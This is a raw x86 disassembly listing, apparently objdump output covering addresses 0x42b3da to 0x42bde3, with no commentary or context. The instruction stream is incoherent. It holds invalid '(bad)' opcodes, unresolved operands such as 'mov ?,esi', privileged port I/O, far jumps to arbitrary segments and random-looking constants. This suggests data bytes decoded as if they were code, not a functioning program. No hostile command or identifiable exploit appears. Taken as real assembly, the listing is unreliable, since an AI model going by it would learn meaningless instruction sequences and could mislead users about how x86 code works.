  42b3da:	xor    DWORD PTR [ecx],edi
  42b3dc:	mov    dl,0x79
  42b3de:	test   DWORD PTR [esi-0x80],ebx
  42b3e1:	retf   
  42b3e2:	mov    ebx,0x4a533c2c
  42b3e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b3e8:	sub    ch,ah
  42b3ea:	push   ecx
  42b3eb:	mov    ds:0xe01f040b,eax
  42b3f0:	out    dx,al
  42b3f1:	cmp    eax,0xec69e2fa
  42b3f6:	not    DWORD PTR [ebx+eiz*2+0x54f83b]
  42b3fd:	jp     0x42b41c
  42b3ff:	dec    eax
  42b400:	add    al,0xb3
  42b402:	adc    eax,0x2c05c3f0
  42b407:	pop    ss
  42b408:	outs   dx,DWORD PTR ds:[esi]
  42b409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b40a:	xor    al,0xc1
  42b40c:	pop    ebp
  42b40d:	pop    esi
  42b40e:	fs pop ebx
  42b410:	sub    al,BYTE PTR [eax]
	...
  42b472:	add    BYTE PTR [eax],al
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [edi-0x460c32db],ecx
  42b485:	iret   
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    eax,0x3e000001
  42b48d:	jno    0x42b47c
  42b48f:	aam    0xc6
  42b491:	mov    WORD PTR [eax-0x61c6322e],cs
  42b497:	sub    cl,BYTE PTR [ebx+0x79]
  42b49a:	in     eax,0x94
  42b49c:	add    eax,0xac162e23
  42b4a1:	cmp    ecx,DWORD PTR [ebx]
  42b4a3:	sbb    eax,0x21cd668
  42b4a8:	add    eax,0x2b8c7611
  42b4ad:	jle    0x42b43e
  42b4af:	adc    al,BYTE PTR [edi+esi*4+0x50377031]
  42b4b6:	xor    eax,esi
  42b4b8:	lock fiadd DWORD PTR [ebx]
  42b4bb:	fcomp  DWORD PTR [edi-0x5c]
  42b4be:	dec    edx
  42b4bf:	jmp    0xf8af:0xdba82f4
  42b4c6:	rol    DWORD PTR [ebx+edx*1],cl
  42b4c9:	data16 add BYTE PTR [esi+0x4a],ch
  42b4cd:	fst    QWORD PTR [ebp+eiz*8-0x71]
  42b4d1:	jecxz  0x42b534
  42b4d3:	dec    edx
  42b4d4:	dec    esp
  42b4d5:	sbb    bl,dh
  42b4d7:	test   al,0xd7
  42b4d9:	xchg   edi,eax
  42b4da:	adc    eax,0x376a294f
  42b4df:	cmp    DWORD PTR [edx+ebp*2+0x71],ebx
  42b4e3:	or     bl,al
  42b4e5:	inc    eax
  42b4e6:	mov    bl,0xa4
  42b4e9:	fidiv  DWORD PTR [esi+0x58437629]
  42b4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b4f0:	jno    0x42b492
  42b4f2:	push   ebx
  42b4f3:	add    al,0xe4
  42b4f5:	clc    
  42b4f6:	xchg   ebp,eax
  42b4f7:	xlat   BYTE PTR ds:[ebx]
  42b4f8:	jle    0x42b488
  42b4fa:	lods   eax,DWORD PTR ds:[esi]
  42b4fb:	sub    ah,BYTE PTR [edx-0x7d]
  42b4fe:	fidivr DWORD PTR [edx-0x32]
  42b501:	shr    dh,cl
  42b503:	shl    BYTE PTR [ebx+0x4b],cl
  42b506:	mov    ds:0xc26779b1,al
  42b50b:	add    BYTE PTR [eax-0x314a10bf],ch
  42b511:	sbb    BYTE PTR [eax+0x18],0xc2
  42b515:	or     eax,0xc0e088f8
  42b51a:	sbb    ecx,DWORD PTR [ebp+0x7800ec4f]
  42b520:	push   edx
  42b521:	(bad)  
  42b522:	pop    edi
  42b523:	das    
  42b524:	mov    BYTE PTR [ebx-0x2239ac88],cl
  42b52a:	in     eax,dx
  42b52b:	xor    al,0x1e
  42b52d:	in     eax,dx
  42b52e:	dec    ecx
  42b52f:	icebp  
  42b530:	enter  0x57cd,0x2
  42b534:	ins    BYTE PTR es:[edi],dx
  42b535:	xor    BYTE PTR [eax+0x2200adef],bh
  42b53b:	add    ecx,edi
  42b53d:	mov    ecx,0x236306ed
  42b542:	and    edi,DWORD PTR [edi]
  42b544:	mov    dl,0x15
  42b546:	push   edi
  42b547:	push   eax
  42b548:	push   es
  42b549:	push   esp
  42b54a:	test   edx,edx
  42b54c:	fs aam 0x29
  42b54f:	jmp    0x42b506
  42b551:	(bad)  
  42b553:	xchg   edi,eax
  42b554:	push   cs
  42b555:	aam    0xfb
  42b557:	add    esi,edx
  42b559:	jmp    0x42b576
  42b55b:	ficom  DWORD PTR [esi+0x4a4a4ed7]
  42b561:	lahf   
  42b562:	std    
  42b563:	call   0xa82d:0x97d02d7e
  42b56a:	sub    esp,esp
  42b56c:	sub    edx,DWORD PTR [ecx]
  42b56e:	js     0x42b5da
  42b570:	outs   dx,DWORD PTR ds:[esi]
  42b571:	xchg   ebx,eax
  42b572:	jno    0x42b5e5
  42b574:	ins    DWORD PTR es:[edi],dx
  42b575:	repz sub edx,0x21ece696
  42b57c:	mov    al,0x1f
  42b57e:	scas   al,BYTE PTR es:[edi]
  42b57f:	and    esp,0xffffffcd
  42b582:	pushf  
  42b583:	xor    DWORD PTR [edx+0x2c],eax
  42b586:	arpl   WORD PTR [esp+ebx*4+0x7],cx
  42b58a:	ins    BYTE PTR es:[edi],dx
  42b58b:	cmp    BYTE PTR [eax+esi*4-0x17],ah
  42b58f:	rcr    BYTE PTR [ebx],0x0
	...
  42b5f2:	add    BYTE PTR [eax],al
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	mov    dl,BYTE PTR [esi-0x2f41f3f8]
  42b606:	add    DWORD PTR [eax],eax
  42b608:	add    eax,0xe9000001
  42b60d:	mov    ds:0x3c539c53,eax
  42b612:	das    
  42b613:	xor    DWORD PTR [esi+ebx*8],ecx
  42b616:	jbe    0x42b5a1
  42b618:	cmp    bh,ah
  42b61a:	adc    ecx,DWORD PTR [eax+0x1c]
  42b61d:	inc    esp
  42b61e:	or     DWORD PTR [ebx],edi
  42b620:	and    eax,0x22acf4ae
  42b625:	cmp    cl,bl
  42b627:	test   cl,cl
  42b629:	stc    
  42b62a:	sub    cl,BYTE PTR [ecx+0x36d21290]
  42b630:	pop    ebx
  42b631:	int    0x46
  42b633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b634:	mul    ah
  42b636:	sbb    DWORD PTR ds:0xc16192d7,edi
  42b63c:	inc    ebx
  42b63d:	sbb    eax,0xdde5ef6b
  42b642:	pop    ebx
  42b643:	pop    ds
  42b644:	rcl    DWORD PTR [ebp-0x177ddef8],0x67
  42b64b:	ret    0x6642
  42b64e:	ja     0x42b63e
  42b650:	mov    eax,ds:0xbb238866
  42b655:	ds cmp bh,0xa7
  42b659:	ret    0x5065
  42b65c:	or     DWORD PTR [eax+0x6d],ebp
  42b65f:	cmp    eax,0x1d932b2f
  42b664:	retf   
  42b665:	xor    bl,dl
  42b667:	adc    BYTE PTR [edx-0x4d],al
  42b66a:	pushf  
  42b66b:	add    edx,DWORD PTR [eax]
  42b66d:	lods   eax,DWORD PTR ds:[esi]
  42b66e:	clc    
  42b66f:	and    eax,0xeeebd204
  42b674:	mov    al,0x17
  42b676:	mov    ebp,0x50e440f
  42b67b:	leave  
  42b67c:	loop   0x42b696
  42b67e:	push   es
  42b67f:	mov    cl,0x91
  42b681:	sbb    dl,0x80
  42b684:	jmp    0x1735:0x1d4b0b9f
  42b68b:	icebp  
  42b68c:	push   ss
  42b68d:	test   al,0xd8
  42b68f:	sti    
  42b690:	lahf   
  42b691:	inc    esi
  42b692:	seta   BYTE PTR ds:0x7a42be44
  42b699:	mov    dh,0x45
  42b69b:	xchg   esi,eax
  42b69c:	rcr    BYTE PTR ds:0x156451f,0xda
  42b6a3:	mov    ah,0xfe
  42b6a5:	mov    al,ds:0xbea5cce4
  42b6aa:	jge    0x42b69a
  42b6ac:	lods   al,BYTE PTR ds:[esi]
  42b6ad:	mov    ds:0x181c5207,al
  42b6b2:	xor    dh,BYTE PTR [eax+0x39]
  42b6b5:	mov    ?,esi
  42b6b7:	add    bh,BYTE PTR [ebp-0x7b8f5e90]
  42b6bd:	rol    BYTE PTR [edi-0x697c90b9],0x15
  42b6c4:	inc    eax
  42b6c5:	xlat   BYTE PTR ds:[ebx]
  42b6c6:	sbb    al,0xf7
  42b6c8:	clc    
  42b6c9:	in     eax,dx
  42b6ca:	loopne 0x42b6dc
  42b6cc:	ja     0x42b6e4
  42b6ce:	jbe    0x42b6ad
  42b6d0:	mov    bh,0xff
  42b6d2:	push   ecx
  42b6d3:	imul   BYTE PTR [edx+edx*4]
  42b6d6:	sbb    ah,dl
  42b6d8:	or     edi,DWORD PTR [ecx-0x6c16024a]
  42b6de:	pop    ebp
  42b6df:	adc    eax,0x839268fa
  42b6e4:	daa    
  42b6e5:	adc    DWORD PTR [edx],0x4c
  42b6e8:	inc    BYTE PTR [ebx-0x3b]
  42b6eb:	fwait
  42b6ec:	lds    ebp,FWORD PTR [ecx+0x38]
  42b6ef:	xchg   ebx,eax
  42b6f0:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  42b6f2:	imul   esp,DWORD PTR [edi-0x48],0x6fc1a965
  42b6f9:	dec    edi
  42b6fa:	dec    esi
  42b6fb:	adc    eax,0x249ff108
  42b700:	nop
  42b701:	popa   
  42b702:	out    dx,eax
  42b703:	sub    al,0xb6
  42b705:	(bad)  
  42b707:	mov    bh,0xc0
  42b709:	sbb    al,0x21
  42b70b:	imul   edx,DWORD PTR [edi-0x19],0x23
  42b70f:	push   ebp
  42b710:	xor    eax,0x0
	...
  42b771:	add    BYTE PTR [eax],al
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	js     0x42b70d
  42b782:	sbb    al,0xd2
  42b784:	ret    
  42b785:	rol    DWORD PTR [ecx],1
  42b787:	add    BYTE PTR ds:0x93000001,al
  42b78d:	fcomp  st(1)
  42b78f:	jnp    0x42b80e
  42b791:	inc    DWORD PTR [ebx+0x70]
  42b794:	sysenter 
  42b796:	and    al,0x26
  42b798:	and    BYTE PTR [ecx],ch
  42b79a:	push   esp
  42b79b:	xor    DWORD PTR [eax+0xc4aee52],edi
  42b7a1:	mov    ds:0x6e6adb7e,eax
  42b7a6:	mov    dl,0x5a
  42b7a8:	dec    BYTE PTR [ebx-0x7a7b65fa]
  42b7ae:	sub    di,WORD PTR [eax]
  42b7b1:	pop    ebx
  42b7b2:	adc    al,0x7d
  42b7b4:	add    ebx,DWORD PTR [ebx-0x38]
  42b7b7:	xlat   BYTE PTR ds:[ebx]
  42b7b8:	or     ebp,DWORD PTR [ebx]
  42b7ba:	fwait
  42b7bb:	and    cl,BYTE PTR [ecx]
  42b7bd:	mov    al,ds:0x1cfbaea0
  42b7c2:	data16 adc al,0x8c
  42b7c5:	xchg   ecx,eax
  42b7c6:	sbb    BYTE PTR [esi+ecx*2-0x86d5309],0xf7
  42b7ce:	dec    ebp
  42b7cf:	(bad)  
  42b7d1:	xor    DWORD PTR [edx],esi
  42b7d3:	fild   WORD PTR [edi-0x7a]
  42b7d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b7d7:	mov    dh,0xb2
  42b7d9:	scas   al,BYTE PTR es:[edi]
  42b7da:	das    
  42b7db:	hlt    
  42b7dc:	jbe    0x42b7a8
  42b7de:	jp     0x42b84e
  42b7e0:	dec    esp
  42b7e1:	fstp   TBYTE PTR [ebp+0x78]
  42b7e4:	bswap  edx
  42b7e6:	sbb    esp,DWORD PTR [edi-0x3736e004]
  42b7ec:	je     0x42b776
  42b7ee:	adc    al,0x66
  42b7f0:	adc    esi,DWORD PTR [eax]
  42b7f2:	pop    es
  42b7f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7f4:	and    DWORD PTR [edi+0x2e],0xd
  42b7f8:	or     bh,bl
  42b7fa:	sbb    al,0xad
  42b7fc:	stos   DWORD PTR es:[edi],eax
  42b7fd:	jae    0x42b85a
  42b7ff:	jns    0x42b814
  42b801:	cmp    DWORD PTR [edx+esi*1+0x96ad725],esp
  42b808:	(bad)  
  42b809:	int3   
  42b80a:	adc    ah,BYTE PTR [eax+0x2033c542]
  42b810:	mov    al,ds:0xfe1c94d8
  42b815:	(bad)  
  42b816:	jge    0x42b83f
  42b818:	mov    cl,bl
  42b81a:	ins    DWORD PTR es:[edi],dx
  42b81b:	call   0x1aa020be
  42b820:	jmp    0xcf7c70c9
  42b825:	cmp    al,0x14
  42b827:	mov    ds:0xd3989952,al
  42b82c:	fsub   QWORD PTR [eax-0x4818ed3f]
  42b832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b833:	sbb    dl,BYTE PTR [edx+edi*1]
  42b836:	leave  
  42b837:	nop
  42b838:	lock scas eax,DWORD PTR es:[edi]
  42b83a:	sub    ah,BYTE PTR [esi]
  42b83c:	stos   DWORD PTR es:[edi],eax
  42b83d:	dec    edi
  42b83e:	(bad)  
  42b83f:	outs   dx,DWORD PTR gs:[esi]
  42b841:	bound  esp,QWORD PTR [ebp-0x4b]
  42b844:	mov    ebx,0xc9624cd9
  42b849:	out    0x95,al
  42b84b:	imul   BYTE PTR [ecx+0x31]
  42b84e:	xchg   ebp,eax
  42b84f:	repz daa 
  42b851:	dec    edi
  42b852:	(bad)  
  42b854:	mov    esi,0x1e763ea3
  42b859:	mov    ebx,0xdcea1ad2
  42b85e:	lock adc al,0x7c
  42b861:	cld    
  42b862:	imul   esp,DWORD PTR [edx],0x77
  42b865:	es loop 0x42b801
  42b868:	push   ds
  42b869:	mov    eax,0x5039493b
  42b86e:	jbe    0x42b88a
  42b870:	adc    al,0x97
  42b872:	mov    dl,0x6b
  42b874:	fisttp WORD PTR [edi]
  42b876:	jle    0x42b842
  42b878:	mov    ebp,0xa23a6925
  42b87d:	fst    QWORD PTR [eax+0x6]
  42b880:	sub    eax,0x128a6100
  42b885:	inc    ebx
  42b886:	jnp    0x42b80a
  42b888:	scas   al,BYTE PTR es:[edi]
  42b889:	jmp    0x3cd42901
  42b88e:	dec    eax
  42b88f:	div    BYTE PTR [esi+0x0]
	...
  42b8f1:	add    BYTE PTR [eax],al
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     esi,DWORD PTR [edx]
  42b901:	test   al,0x55
  42b903:	jmp    0x105:0x1d2c8
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	or     BYTE PTR [esp+edx*4-0x2ce24635],bh
  42b913:	icebp  
  42b914:	das    
  42b915:	push   ds
  42b916:	sub    ecx,DWORD PTR [edx-0x2a5120b6]
  42b91c:	xor    bl,BYTE PTR [edx]
  42b91e:	add    esp,esp
  42b920:	xchg   esp,eax
  42b921:	or     eax,0xe90d651f
  42b926:	sub    BYTE PTR [ebx+0x62],bl
  42b929:	ja     0x42b972
  42b92b:	cmp    eax,0xcb60ebb2
  42b930:	xor    dl,BYTE PTR [edx+0x406f50c6]
  42b936:	cmp    ebx,esi
  42b938:	retf   0x3e48
  42b93b:	jne    0x42b8d4
  42b93d:	ficom  DWORD PTR [edx]
  42b93f:	pop    edi
  42b940:	jp     0x42b913
  42b942:	scas   eax,DWORD PTR es:[edi]
  42b943:	test   eax,0xe07fdc5
  42b948:	ja     0xa47d9c87
  42b94e:	and    eax,0x6c215e38
  42b953:	add    al,0x86
  42b955:	jns    0x42b980
  42b957:	lods   al,BYTE PTR ds:[esi]
  42b958:	sub    ebx,DWORD PTR [edx+0xa]
  42b95b:	mov    ch,0xdd
  42b95d:	sar    DWORD PTR [ebx-0x795c503a],cl
  42b963:	jle    0x42b8f0
  42b965:	nop
  42b966:	out    dx,al
  42b967:	test   eax,0xcfffa519
  42b96c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b96d:	pop    ecx
  42b96e:	mov    DWORD PTR ds:0x9ac7b9f5,0x68e92a17
  42b978:	mov    ebx,0x1e0d80dc
  42b97d:	test   eax,0x254c0b1b
  42b982:	mov    eax,edi
  42b984:	mov    edx,ebp
  42b986:	retf   0xc917
  42b989:	fsub   DWORD PTR [edi+0x2ddf9102]
  42b98f:	xlat   BYTE PTR ds:[ebx]
  42b990:	mov    eax,ds:0x6e90d634
  42b995:	sahf   
  42b996:	jecxz  0x42b9ff
  42b998:	adc    edi,DWORD PTR [edi]
  42b99a:	stc    
  42b99b:	mov    ds:0x64a215ed,al
  42b9a0:	mov    ebx,0x44c75adf
  42b9a5:	cmp    al,0x7b
  42b9a7:	xor    ch,BYTE PTR [esi+0x958e756]
  42b9ad:	inc    eax
  42b9ae:	sbb    ch,0x6d
  42b9b1:	pop    edi
  42b9b2:	repz int 0x81
  42b9b5:	pop    ecx
  42b9b6:	cmp    ebx,DWORD PTR [ebx+edi*2+0x2f9b548f]
  42b9bd:	cmp    bl,BYTE PTR [esi+0x74fe006a]
  42b9c3:	or     eax,0x9783c82a
  42b9c8:	push   cs
  42b9c9:	pop    edi
  42b9ca:	mov    dl,BYTE PTR [ebp+edx*4+0x11]
  42b9ce:	adc    eax,0xe0436924
  42b9d3:	fld    TBYTE PTR [esp+edi*8]
  42b9d6:	mov    ebx,0xa90b5192
  42b9db:	jg     0x42ba1d
  42b9dd:	push   ss
  42b9de:	test   BYTE PTR [ebx],cl
  42b9e0:	inc    ecx
  42b9e1:	mov    fs,WORD PTR [esi]
  42b9e3:	adc    edx,DWORD PTR [edi]
  42b9e5:	or     al,0x6
  42b9e7:	stos   BYTE PTR es:[edi],al
  42b9e8:	add    al,0xe9
  42b9ea:	es arpl sp,dx
  42b9ed:	xchg   eax,edi
  42b9ef:	inc    edx
  42b9f0:	push   ebx
  42b9f1:	ds in  eax,0x35
  42b9f4:	mov    esi,DWORD PTR [ebp-0x3e]
  42b9f7:	mov    esp,edi
  42b9f9:	pop    esp
  42b9fa:	les    edi,FWORD PTR [esi+0x6550fd09]
  42ba00:	xchg   BYTE PTR [edi],al
  42ba02:	test   edx,0xb5816e5b
  42ba08:	pop    esi
  42ba09:	rol    BYTE PTR [edx+0x32d96846],1
  42ba0f:	clc    
  42ba10:	jmp    0x0:0x0
	...
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     esp,esi
  42ba81:	scas   al,BYTE PTR es:[edi]
  42ba82:	sahf   
  42ba83:	outs   dx,BYTE PTR ds:[esi]
  42ba84:	int    0xd3
  42ba86:	add    DWORD PTR [eax],eax
  42ba88:	add    eax,0x38000001
  42ba8d:	mov    edx,0x1afcc1d5
  42ba92:	dec    esi
  42ba93:	retf   
  42ba94:	mov    dh,0x54
  42ba96:	aam    0x2c
  42ba98:	cld    
  42ba99:	stos   BYTE PTR es:[edi],al
  42ba9a:	mov    ebx,0x2ed7c1d9
  42ba9f:	enter  0x2fab,0xf7
  42baa3:	cmc    
  42baa4:	jne    0x42bad1
  42baa6:	lds    edi,FWORD PTR [esi]
  42baa8:	xchg   edi,eax
  42baa9:	pop    ss
  42baaa:	inc    ecx
  42baab:	adc    esp,esi
  42baad:	loope  0x42ba42
  42baaf:	push   0xb69db0fb
  42bab4:	ja     0x42bab3
  42bab6:	fwait
  42bab7:	lahf   
  42bab8:	ret    
  42bab9:	(bad)  
  42baba:	fcomp  DWORD PTR [esi]
  42babc:	lock mov dl,0x59
  42babf:	pop    es
  42bac0:	xchg   ebx,eax
  42bac1:	test   DWORD PTR [edx-0x7c],0x8c8d59bd
  42bac8:	test   eax,0x76568073
  42bacd:	out    0x13,al
  42bacf:	push   esp
  42bad0:	psrlw  mm3,QWORD PTR [eax-0x68]
  42bad4:	mov    al,ds:0x36553137
  42bad9:	jp     0x42baa3
  42badb:	xor    al,0x47
  42badd:	test   al,0x2c
  42badf:	sahf   
  42bae0:	adc    al,0xb
  42bae2:	popf   
  42bae3:	into   
  42bae4:	nop
  42bae5:	lods   al,BYTE PTR ds:[esi]
  42bae6:	or     ch,BYTE PTR [ebx+0xbe94ff6]
  42baec:	xor    dl,BYTE PTR [bx+0x27]
  42baf0:	mov    esi,0x6f955138
  42baf5:	xchg   esi,eax
  42baf6:	pop    es
  42baf7:	dec    esi
  42baf8:	or     al,0x80
  42bafa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bafb:	xor    al,BYTE PTR [ebx+ebp*8+0x2fa95da8]
  42bb02:	push   es
  42bb03:	mov    WORD PTR [edi],ds
  42bb05:	les    eax,FWORD PTR [esi]
  42bb07:	xchg   ebp,eax
  42bb08:	xchg   ecx,eax
  42bb09:	out    0x68,eax
  42bb0b:	ficom  DWORD PTR [edi-0x72]
  42bb0e:	mov    edi,0xb436e64f
  42bb13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bb14:	adc    eax,0xde93ef5f
  42bb19:	and    DWORD PTR [ebx-0x7a132d71],edi
  42bb1f:	dec    edi
  42bb20:	and    ah,BYTE PTR [ecx-0x73]
  42bb23:	xlat   BYTE PTR ds:[ebx]
  42bb24:	test   DWORD PTR [ebp-0xebdca12],ecx
  42bb2a:	pop    edx
  42bb2b:	jns    0x42bb49
  42bb2d:	adc    al,0x5b
  42bb2f:	sbb    al,0x74
  42bb31:	xor    eax,ebx
  42bb33:	pcmpeqd mm1,QWORD PTR [eax-0x2244a29a]
  42bb3a:	dec    esi
  42bb3b:	shl    BYTE PTR [esi-0x6f],0x9b
  42bb3f:	jp     0x42baf6
  42bb41:	popf   
  42bb42:	mov    dh,0x9a
  42bb44:	push   esp
  42bb45:	call   0xa1db:0xc517b661
  42bb4c:	aam    0xe
  42bb4e:	aaa    
  42bb4f:	loope  0x42bafc
  42bb51:	xor    DWORD PTR [esp+eax*1],esi
  42bb54:	pop    ebp
  42bb55:	mov    ebx,0x839eac29
  42bb5a:	sbb    al,cl
  42bb5c:	jne    0x42bb33
  42bb5e:	sub    ecx,DWORD PTR [ebp-0x18]
  42bb61:	jl     0x42bb10
  42bb63:	mov    ah,0x96
  42bb65:	inc    ebp
  42bb66:	ins    BYTE PTR es:[edi],dx
  42bb67:	call   0xe127:0xdcd3a92c
  42bb6e:	les    esi,FWORD PTR [edi-0x60]
  42bb71:	mov    edi,0x5b0964ca
  42bb76:	dec    eax
  42bb77:	cmp    esi,DWORD PTR [edx]
  42bb79:	jo     0x42bbae
  42bb7b:	adc    DWORD PTR [ebx-0x70cd5964],edi
  42bb81:	dec    edx
  42bb82:	sub    eax,0x7f9fd053
  42bb87:	(bad)  
  42bb88:	out    dx,eax
  42bb89:	shl    DWORD PTR [edx],1
  42bb8b:	out    dx,al
  42bb8c:	sub    BYTE PTR [edi],ah
  42bb8e:	mov    ?,edx
  42bb90:	add    DWORD PTR [eax],eax
	...
  42bbf2:	add    BYTE PTR [eax],al
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	aaa    
  42bc01:	and    BYTE PTR [edi+0x1d4d21c],0x0
  42bc08:	add    eax,0x9b000001
  42bc0d:	popa   
  42bc0e:	lds    edx,FWORD PTR [eax]
  42bc10:	test   edi,ebx
  42bc12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc13:	push   ss
  42bc14:	pushf  
  42bc15:	add    eax,0x64868e3d
  42bc1a:	arpl   WORD PTR ds:0x100d06f,sp
  42bc20:	sub    ebx,DWORD PTR [ebx]
  42bc22:	push   DWORD PTR ds:0x51bdc166
  42bc28:	ja     0x42bc91
  42bc2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc2b:	push   es
  42bc2c:	cwde   
  42bc2d:	out    0x5a,al
  42bc2f:	pop    ss
  42bc30:	inc    ecx
  42bc31:	pop    edi
  42bc32:	fld    DWORD PTR [edi-0x60]
  42bc35:	inc    ebx
  42bc36:	cwde   
  42bc37:	mov    ch,0xdb
  42bc39:	push   ds
  42bc3a:	ret    0x3119
  42bc3d:	xor    ch,ah
  42bc3f:	cmc    
  42bc40:	xchg   ecx,eax
  42bc41:	push   0x518a6a2f
  42bc46:	sub    ecx,DWORD PTR [edx+0x440363f3]
  42bc4c:	sahf   
  42bc4d:	shl    DWORD PTR [ebp-0x38991e50],cl
  42bc53:	sbb    eax,0x6244a270
  42bc58:	sub    BYTE PTR [ecx+0x12c125b],dl
  42bc5e:	dec    ebp
  42bc5f:	sbb    al,0xd6
  42bc61:	sbb    eax,0x9be0479c
  42bc66:	cmp    bh,BYTE PTR [ecx]
  42bc68:	pop    es
  42bc69:	sbb    eax,0xdc556753
  42bc6e:	pop    dx
  42bc70:	dec    ebp
  42bc71:	xchg   BYTE PTR [esi+0x21868928],al
  42bc77:	inc    eax
  42bc78:	mov    al,0xd3
  42bc7a:	clc    
  42bc7b:	adc    eax,0x183352bb
  42bc80:	fiadd  WORD PTR [edx+0xd2f8017]
  42bc86:	dec    eax
  42bc87:	jns    0x42bc76
  42bc89:	lods   eax,DWORD PTR ds:[esi]
  42bc8a:	ret    
  42bc8b:	fs jbe 0x42bc9a
  42bc8e:	ficomp WORD PTR [ebx+0x2b6868a]
  42bc94:	popf   
  42bc95:	pop    esp
  42bc96:	add    al,BYTE PTR [edx-0x7c393c8b]
  42bc9c:	sub    eax,0x1e667f71
  42bca1:	jo     0x42bc23
  42bca3:	sub    edi,DWORD PTR [edx]
  42bca5:	cvtpi2ps xmm7,QWORD PTR [ebx]
  42bca8:	test   BYTE PTR [edx-0x7bb28faf],0x36
  42bcaf:	ror    al,1
  42bcb1:	inc    esi
  42bcb2:	sbb    BYTE PTR [ebx],bl
  42bcb4:	jno    0x42bd22
  42bcb6:	add    BYTE PTR [eax-0x3ff0e64b],cl
  42bcbc:	push   ebx
  42bcbd:	push   ebx
  42bcbe:	es mov edx,0x9d695eb9
  42bcc4:	mov    dl,BYTE PTR [edx-0x37]
  42bcc7:	(bad)  [esi+0x1c67031e]
  42bccd:	ror    DWORD PTR [esi+ebx*4-0x30315987],cl
  42bcd4:	fcom   QWORD PTR [eax-0x33b0b899]
  42bcda:	push   ds
  42bcdb:	sti    
  42bcdc:	mov    ds:0x931c7d9e,eax
  42bce1:	fwait
  42bce2:	sub    eax,0x2e7b963d
  42bce7:	ds inc edx
  42bce9:	push   edi
  42bcea:	cmp    ecx,0xaec40117
  42bcf0:	icebp  
  42bcf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcf2:	jg     0x42bcd2
  42bcf4:	xor    eax,0x5f06a174
  42bcf9:	out    0x36,al
  42bcfb:	sub    eax,0x1b11211e
  42bd00:	or     eax,0x183a48c4
  42bd05:	ja     0x42bcce
  42bd07:	lahf   
  42bd08:	pop    ebx
  42bd09:	scas   al,BYTE PTR es:[edi]
  42bd0a:	add    ch,BYTE PTR [ebp+0x43d6f903]
  42bd10:	pop    ebp
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd9f
  42bd81:	pop    ebp
  42bd82:	(bad)  
  42bd83:	imul   edx,edi,0x50001d5
  42bd89:	add    DWORD PTR [eax],eax
  42bd8b:	add    ah,dh
  42bd8d:	iret   
  42bd8e:	out    0x3e,al
  42bd90:	or     ah,ah
  42bd92:	outs   dx,BYTE PTR ds:[esi]
  42bd93:	daa    
  42bd94:	pushf  
  42bd95:	xchg   edx,eax
  42bd96:	js     0x42bd3a
  42bd98:	jbe    0x42bd81
  42bd9a:	arpl   WORD PTR [eax],ax
  42bd9c:	xor    BYTE PTR [eax-0xc],ah
  42bd9f:	int    0xe7
  42bda1:	mov    cl,0x45
  42bda3:	cdq    
  42bda4:	adc    DWORD PTR [edi],ecx
  42bda6:	loope  0x42bdf8
  42bda8:	and    ebp,DWORD PTR [edi]
  42bdaa:	fcomp  DWORD PTR [ebp+0x2a4688d2]
  42bdb0:	(bad)  
  42bdb1:	(bad)  
  42bdb2:	ds sahf 
  42bdb4:	shl    BYTE PTR [ebx-0x16],0x3f
  42bdb8:	inc    edx
  42bdb9:	push   ecx
  42bdba:	jmp    0x42be21
  42bdbc:	xlat   BYTE PTR ds:[ebx]
  42bdbd:	or     BYTE PTR [ebx],al
  42bdbf:	out    dx,eax
  42bdc0:	xor    BYTE PTR [edi],cl
  42bdc2:	rcr    DWORD PTR [esi-0x62],1
  42bdc5:	push   edx
  42bdc6:	scas   eax,DWORD PTR es:[edi]
  42bdc7:	adc    DWORD PTR [ebx-0x59],0xffffffa5
  42bdcb:	cld    
  42bdcc:	repz cld 
  42bdce:	sub    ebp,DWORD PTR [esi]
  42bdd0:	or     BYTE PTR [esi-0x494af683],bl
  42bdd6:	pop    esp
  42bdd7:	xchg   DWORD PTR [ecx+0x2c977cd],edx
  42bddd:	or     edx,DWORD PTR [ebx]
  42bddf:	fld    TBYTE PTR [edi]
  42bde1:	fld    QWORD PTR [ecx]
  42bde3:	adc    DWORD PTR [edx+ebx*8+0x75],ebp
